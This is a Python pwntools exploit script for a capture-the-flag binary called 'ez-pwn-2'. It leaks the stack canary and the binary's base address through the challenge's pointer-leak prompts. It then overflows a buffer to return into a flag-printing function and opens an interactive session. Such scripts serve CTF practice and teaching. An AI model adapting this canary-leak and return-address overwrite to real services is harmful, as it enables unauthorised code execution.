#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn

BINARY = "ez-pwn-2"
LIBC = "/usr/lib/libc-2.32.so"
LD = "/lib64/ld-linux-x86-64.so.2"

# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
b* gimme_pointer
source /root/Downloads/pwndbg/gdbinit.py
'''.format(**locals())

def write_ptr(ptr: bytes):
    return "".join([chr(ptr[i+1]) + chr(ptr[i]) for i in range(0, len(ptr)-1, 2)])[::-1].encode()

def exp():

    io = start()

    offt_leak = 0
    if pwn.args.REMOTE:
        offt_leak = 0x18
    elif pwn.args.LOCAL:
        offt_leak = 0x10

    io.recvuntil(b"You are here: ")
    stack = io.recvline().replace(b"\n", b"").replace(b"0x", b"")

    io.sendlineafter(b"leaked bytes:\n", write_ptr(hex((int(stack, 16) + 0x18)).encode()))
    io.recvuntil(b":\n")
    canary = int(write_ptr(io.recvline().replace(b"\n", b"")), 16)
    pwn.log.info(f"canary: {hex(canary)}")

    io.sendlineafter(b"leaked bytes:\n", write_ptr(hex((int(stack, 16) - offt_leak)).encode()))

    io.recvuntil(b":\n")
    exe.address = int(write_ptr(io.recvline().replace(b"\n", b"")), 16) & ~0xfff
    pwn.log.info(f"bin: {hex(exe.address)}")

    io.sendlineafter(b"leaked bytes:\n", b"t"*0x18 + pwn.p64(canary)*2 + pwn.p64(exe.sym.this_function_literally_prints_the_flag))
    
    io.interactive()

if __name__ == "__main__":
    exp()
